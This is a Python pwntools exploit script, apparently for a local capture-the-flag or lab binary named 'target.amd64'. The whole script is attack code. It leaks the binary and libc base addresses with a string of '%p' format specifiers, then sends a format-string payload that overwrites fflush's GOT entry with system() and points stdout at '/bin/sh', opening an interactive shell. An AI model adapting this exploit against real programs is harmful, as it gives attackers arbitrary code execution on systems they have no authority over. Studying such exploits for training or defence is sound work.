from pwn import *

file_breakpoints = "breaks64.gdb"
file_binary = "target.amd64"
context.binary = elf = ELF(f"./{file_binary}")
libc = elf.libc


def run_locally(debug = True):
    p = process([elf.path])
    pid = util.proc.pidof(p)[0]
    if debug == True:
        gdb = f"gdb -q -p {pid} -x {file_breakpoints}"
        log.debug(f"Gdb uses breakpoints from {file_breakpoints}")
        new_tab = "wt -p 'PowerShell' -d ."  # Open new tab in Windows Terminal (PowerShell profile and current dir)
        wsl = f"wsl -e bash -c '{gdb}\; exec $BASH'"
        cmd = f"cmd.exe /c start {new_tab} {wsl}"
        os.system(cmd)
        util.proc.wait_for_debugger(pid)
    return p


def find_bad_bytes(buf, bad_bytes = None):
    if bad_bytes is None:
        bad_bytes = [
            0xa,  # 0xa = 10 = "\n", gets() takes all the chars up to "\n"
        ]
    found = False
    for i, byte in enumerate(buf):
        if byte in bad_bytes:
            log.warn(f"Bad byte '{hex(byte)}' at {i}")
            found = True
    if found:
        print(hexdump(buf, highlight = bad_bytes))
        log.error("Found bad bytes in a buffer!")


def main():
    # RUN PROCESS
    p = run_locally(debug = False)

    print("\nITERATION #1: leak base addresses")
    stdin = b"%p  " * 50  # Print 64-bit addresses
    log.info("=== STDIN")
    find_bad_bytes(stdin)
    print(stdin.decode())
    p.writeline(stdin)
    log.info("=== STDOUT")
    stdout = p.recv()
    print(stdout.decode())

    # ANALYSIS
    # Find base addresses of binary & libc
    elf_offset = 0x11a9  # Offset of main() in binary
    libc_offset = 0x29d90  # Offset of "mov edi, eax" in libc.so
    elf.address = int(stdout.split(b"  ")[44], 16) - elf_offset  # 44 is offset of binary address in printf() output
    libc.address = int(stdout.split(b"  ")[42], 16) - libc_offset  # 42 is offset of libc address in printf() output
    log.success(f"{file_binary} base = {hex(elf.address)}")
    log.success(f"libc.so base = {hex(libc.address)}")

    # fflush(stdout) => system("/bin/sh")
    buf_offset = 8  # Offset of the buffer in printf() output
    rw_addr = elf.address + 0x4050  # Address of FILE *stdout (stdout@GLIBC_2_2_5)
    fflush_got = elf.got["fflush"]
    system_sym = libc.sym["system"]
    binsh = next(libc.search(b"/bin/sh"))
    payload_writes = {
        fflush_got: system_sym,
        rw_addr: binsh
    }
    stdin = fmtstr_payload(buf_offset, payload_writes, write_size = "short")

    pause()
    print("\nITERATION #2: run shell")
    log.info("=== STDIN")
    find_bad_bytes(stdin)
    print(hexdump(stdin))
    p.writeline(stdin)
    p.clean()
    p.interactive()


if __name__ == "__main__":
    main()
